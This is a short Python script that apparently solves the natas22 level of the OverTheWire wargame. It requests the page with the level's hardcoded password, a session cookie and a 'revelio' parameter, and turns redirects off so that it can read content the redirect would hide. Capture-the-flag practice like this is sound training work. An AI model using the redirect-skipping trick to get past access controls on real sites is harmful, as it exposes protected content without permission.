import requests


url2="http://natas22.natas.labs.overthewire.org"
auth2=("natas22","d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz")
params2={
    "revelio":1
}
cookies={
    "PHPSESSID":"5pp7odbf8em2cph00qiujde81r"
}


r2=requests.get(
    url2,
    auth=auth2,
    params=params2,
    cookies=cookies,
    allow_redirects=False
)


print(r2.status_code)
print(r2.text)
